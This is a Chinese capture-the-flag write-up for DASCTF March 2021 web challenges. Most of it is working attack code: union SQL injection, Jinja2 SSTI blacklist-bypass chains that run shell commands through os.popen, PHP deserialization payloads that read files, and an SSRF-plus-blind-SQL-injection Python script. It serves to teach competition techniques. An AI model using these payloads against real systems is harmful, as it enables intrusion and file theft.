---
title: 2021 DASCTF三月赛
date: 2021-04-06 22:55:59
updated: 2021-04-06 22:55:59
categories: Write up
---

2021 MAR DASCTF 明御攻防赛 Web Writeup<!--more-->

# BestDB

查看源码发现注释

> <!-- $sql = "SELECT * FROM users WHERE id = '$query' OR username = \"$query\"";-->

同时通过fuzz,发现过滤了单引号和空格

注释里的sql语句id和username是用OR连接，因为双引号没有被过滤，因此我们可以利用username

![](https://img.npfs06.top/20210406142203.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



测试得出回显位为1、2

查数据库名

```sql
-1"union/**/select/**/1,database(),3"

#users
```

查表名

```sql
-1"union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),3"

#f1agdas,users
```

查列名

```sql
-1"union/**/select/**/1,(select/**/f1agdas/**/from/**/f1agdas/**/where/**/id=1),3"
#flag.txt
```



读flag.txt

```sql
-1"/**/union/**/select/**/1,(select(substr(load_file(0x2f666c61672e747874),1,100))),3"
```



#  baby_flask 

 看源码

```html
<!--
Hi young boy!</br>
Do you like ssti?</br>

blacklist</br>   
'.','[','\'','"',''\\','+',':','_',</br>   
'chr','pop','class','base','mro','init','globals','get',</br>   
'eval','exec','os','popen','open','read',</br>   
'select','url_for','get_flashed_messages','config','request',</br>   
'count','length','０','１','２','３','４','５','６','７','８','９','0','1','2','3','4','5','6','7','8','9'</br>    
</br>   

-->
```

fuzz后发现没过滤掉|attr，因此拿attr来绕即可，利用flask中的join过滤器同样可以拼接出：

```html
{% set gl=dict(glo=a,bals=a)|join%}
```

拿python做了个例子，原理类似

![](https://img.npfs06.top/20210406200259.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



数字被过滤了可以使用这些特殊的数字来绕过

![](http://img.npfs06.top/20210406204043.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



![](https://img.npfs06.top/20210406203323.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

```php
{%set a=dict(po=aa,p=aa)|join%} # pop
{%set b=lipsum|string|list|attr(a)(𝟙𝟠)%} # _
{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%} # globals
{%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%} # getitem
{%set e=dict(o=cc,s=aa)|join%} # os
{%set f=lipsum|string|list|attr(a)(𝟡)%} # 空格
{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%} # 斜杠
{%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%} # cat /flag
{%set h=(a,dict(en=aa)|join|join)|join%} # popen
{%set i=dict(re=aa,ad=aa)|join%} # read
{%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%} #点
{%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%} #ls /var/www/flask
{%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%}{{j}}
#最后拼接起来
#{{lipsum.__globals__['os'].popen('ls /var/www/flask').read()}}
```

最后的`payload`如下，成功执行`ls /var/www/flask`就可以看到`flag`了

```
name={%set a=dict(po=aa,p=aa)|join%}{%set b=lipsum|string|list|attr(a)(𝟙𝟠)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{%set f=lipsum|string|list|attr(a)(𝟡)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%}{%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%}{%set h=(a,dict(en=aa)|join|join)|join%}{%set i=dict(re=aa,ad=aa)|join%}{%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%}{%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%}{%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%}{{j}}
```



当然上面这种做法是利用了unicode编码，如果不利于unicode编码，我们也有办法

比如我们要构造下划线`_`

```html
{% set id=dict(ind=a,ex=a)|join%}
{% set pp=dict(po=a,p=a)|join%}
{% set nn=dict(n=a)|join%}
{% set tt=dict(t=a)|join%}
{% set ff=dict(f=a)|join%}
{% set five=(lipsum|string|list)|attr(id)(tt) %}
{% set three=(lipsum|string|list)|attr(id)(nn) %}
{% set one=(lipsum|string|list)|attr(id)(ff) %}
{% set shiba=five*five-three-three-one %}
{% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %}
{{xiahuaxian}}
```

相当于`(lipsum|string|list).pop(18)`

放几个其他师傅的payload:

```
{% set id=dict(ind=a,ex=a)|join%}
{% set pp=dict(po=a,p=a)|join%}
{% set ls=dict(ls=a)|join%}
{% set ppe=dict(po=a,pen=a)|join%}
{% set gt=dict(ge=a,t=a)|join%}
{% set cr=dict(ch=a,r=a)|join%}
{% set nn=dict(n=a)|join%}
{% set tt=dict(t=a)|join%}
{% set ff=dict(f=a)|join%}
{% set ooqq=dict(o=a,s=a)|join %}
{% set rd=dict(re=a,ad=a)|join%}
{% set five=(lipsum|string|list)|attr(id)(tt) %}
{% set three=(lipsum|string|list)|attr(id)(nn) %}
{% set one=(lipsum|string|list)|attr(id)(ff) %}
{% set shiba=five*five-three-three-one %}
{% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %}
{% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %}
{% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %}
{% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %}
{% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%}
{% set space=chcr(three*three*five-five-five-three) %}
{% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %}
{{(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()}}

```

相当于执行

```
lipsum.__globals__.get('os').popen('ls /var/www/flask').read()
```

---

```
# 首先构造出所需的数字: 
{% set zero = (self|int) %}    # 0, 也可以使用lenght过滤器获取数字
{% set one = (zero**zero)|int %}    # 1
{% set two = (zero-one-one)|abs %}    # 2
{% set four = (two*two)|int %}    # 4
{% set five = (two*two*two)-one-one-one %}    # 5
{% set three = five-one-one %}    # 3
{% set nine = (two*two*two*two-five-one-one) %}    # 9
{% set seven = (zero-one-one-five)|abs %}    # 7

# 构造出所需的各种字符与字符串: 
{% set space = self|string|min %}    # 空格
{% set point = self|float|string|min %}    # .

{% set c = dict(c=aa)|reverse|first %}    # 字符 c
{% set bfh = self|string|urlencode|first %}    # 百分号 %
{% set bfhc = bfh~c %}    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
{% set slas = bfhc%((four~seven)|int) %}    # 使用%c构造斜杠 /
{% set yin = bfhc%((three~nine)|int) %}    # 使用%c构造引号 '
{% set xhx = bfhc%((nine~five)|int) %}    # 使用%c构造下划线 _
{% set right = bfhc%((four~one)|int) %}    # 使用%c构造右括号 )
{% set left = bfhc%((four~zero)|int) %}    # 使用%c构造左括号 (

{% set but = dict(buil=aa,tins=dd)|join %}    # builtins
{% set imp = dict(imp=aa,ort=dd)|join %}    # import
{% set pon = dict(po=aa,pen=dd)|join %}    # popen
{% set so = dict(o=aa,s=dd)|join %}    # os
{% set ca = dict(ca=aa,t=dd)|join %}    # cat
{% set flg = dict(fl=aa,ag=dd)|join %}    # flag
{% set ev = dict(ev=aa,al=dd)|join %}    # eval
{% set red = dict(re=aa,ad=dd)|join %}    # read
{% set bul = xhx~xhx~but~xhx~xhx %}    # __builtins__

{% set ini = dict(ini=aa,t=bb)|join %}    # init
{% set glo = dict(glo=aa,bals=bb)|join %}    # globals
{% set itm = dict(ite=aa,ms=bb)|join %}    # items

# 将上面构造的字符或字符串拼接起来构造出 __import__('os').popen('cat /flag').read(): 
{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}

# 然后将上面构造的各种变量添加到SSTI万能payload里面就行了: 
{% for f,v in (whoami|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}    # globals
	{% if f == bul %} 
		{% for a,b in (v|attr(itm))() %}    # builtins
			{% if a == ev %}    # eval
				{{b(pld)}}    # eval("__import__('os').popen('cat /flag').read()")
			{% endif %}
		{% endfor %}
	{% endif %}
{% endfor %}

# 最后的payload如下:
{% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set three = five-one-one %}{% set nine = (two*two*two*two-five-one-one) %}{% set seven = (zero-one-one-five)|abs %}{% set space = self|string|min %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc = bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}
```



# ez_serialize 

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class A{
    public $class;
    public $para;
    public $check;
    public function __construct()
    {
        $this->class = "B";
        $this->para = "ctfer";
        echo new  $this->class ($this->para);
    }
    public function __wakeup()
    {
        $this->check = new C;
        if($this->check->vaild($this->para) && $this->check->vaild($this->class)) {
            echo new  $this->class ($this->para);
        }
        else
            die('bad hacker~');
    }

}
class B{
    var $a;
    public function __construct($a)
    {
        $this->a = $a;
        echo ("hello ".$this->a);
    }
}
class C{

    function vaild($code){
        $pattern = '/[!|@|#|$|%|^|&|*|=|\'|"|:|;|?]/i';
        if (preg_match($pattern, $code)){
            return false;
        }
        else
            return true;
    }
}


if(isset($_GET['pop'])){
    unserialize($_GET['pop']);
}
else{
    $a=new A;

} hello ctfer
```



SLP类中存在能够进行文件处理和迭代的类：

| 类                 | 描述                                                        |
| :----------------- | :---------------------------------------------------------- |
| DirectoryIterator  | 遍历目录                                                    |
| FilesystemIterator | 遍历目录                                                    |
| GlobIterator       | 遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag* |
| SplFileObject      | 读取文件，按行读取，多行需要遍历                            |
| finfo/finfo_open() | 需要两个参数                                                |

```php
//遍历php本身内置类
<?php
$classes = get_declared_classes();
foreach ($classes as $class) {
    $methods = get_class_methods($class);
    foreach ($methods as $method) {
        if (in_array($method, array(
            '__destruct',
            '__toString',
            '__wakeup',
            '__call',
            '__callStatic',
            '__get',
            '__set',
            '__isset',
            '__unset',
            '__invoke',
            '__set_state'
        ))) {
            echo $class . '::' . $method."\n";
        }
    }
}
```

其实真正用到的也就是Class A

**payload:**

1.遍历文件

通过遍历，我们知道FilesystemIterator类有toSring方法，可以利用

![](https://img.npfs06.top/20210406225357.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

```php
<?php
class A{
    public $class='FilesystemIterator';
    public $para="/var/www/html";
    public $check;
    }
$o  = new A();
echo serialize($o);

```

2.读取flag文件

通过遍历，我们知道SplFileObject类有toSring方法，可以利用

![](https://img.npfs06.top/20210406225302.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)


```php
<?php
class A
{
    public $class="SplFileObject";
    public $para="/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php";
}
$a = new A();
echo serialize($a);
```



# ez_login



```
<?php
    if(!isset($_SESSION)){
        highlight_file(__FILE__);
        die("no session");
    }
    include("./php/check_ip.php");
    error_reporting(0);
    $url = $_GET['url'];
    if(check_inner_ip($url)){
        if($url){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
            $output = curl_exec($ch);
            $result_info = curl_getinfo($ch);
            curl_close($ch);
            }
    }else{
        echo "Your IP is internal yoyoyo";
    }
    
?>
no session
```

要求存在session，可以利用PHP_SESSION_UPLOAD_PROGRESS设置PHPSESSID=flag

```html
<!DOCTYPE html>
<html>
<body>
<form action="http://183.129.189.60:10015/?url=http://localhost/admin.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" value="submit" />
</form>
</body>
</html>
```

随便传一个文件，同时添加Cookie即可

SSRF，其中外部ip、127.0.0.1都被ban了，localhost可以，这里有个admin.php

![](https://img.npfs06.top/20210407191625.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

访问路径，下载压缩包

```php
//se1f_Log3n.php

<?php
include("./php/db.php");
include("./php/check_ip.php");
error_reporting(E_ALL);
$ip = $_SERVER["REMOTE_ADDR"];
if($ip !== "127.0.0.1"){
    exit();
}else{
    try{
    $sql = 'SELECT `username`,`password` FROM `user` WHERE `username`= "'.$username.'" and `password`="'.$password.'";';
    $result = $con->query($sql);
    echo $sql;
    }catch(Exception $e){
        echo $e->getMessage();
    }
    ($result->num_rows > 0 AND $row = $result->fetch_assoc() AND $con->close() AND die("error")) OR ( ($con->close() AND die('Try again!') )); 
}
```



sql注入

```python
import requests
import time

flag = ''
sessid = 'flag'
for i in range(100):
    for j in range(32,128):
        if j==127:
            exit()
        # url = "http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=' or length(database())>0-- %26password=admin"
        # url = "http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=' or ascii(substr((select password from users where username='admin'),%d,1))=%d-- %26password="%(len(flag)+1,i)
        # url = "http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=' or ascii(substr(hex((select password from users where username='admin')),{},1))={}-- %26password=".format(len(flag)+1,j)
        # url = "http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=' or ascii(substr((database()),{},1))={}-- %26password=".format(len(flag)+1,j)
        url = "http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=' or ascii(substr((load_file('/flag')),{},1))={}-- %26password=".format(len(flag)+1,j)
        session = requests.session()
        response = session.post(url,data={'PHP_SESSION_UPLOAD_PROGRESS': 'x'},files={'file': open('C:/Users/Administrator/Desktop/1.txt', 'rb')}, cookies={'PHPSESSID': sessid})   //这里的文件名是本地随意创建的
        time.sleep(0.3)
        if 'correct?' in response.text:
            flag+=chr(j)
            print(flag)
            break
```

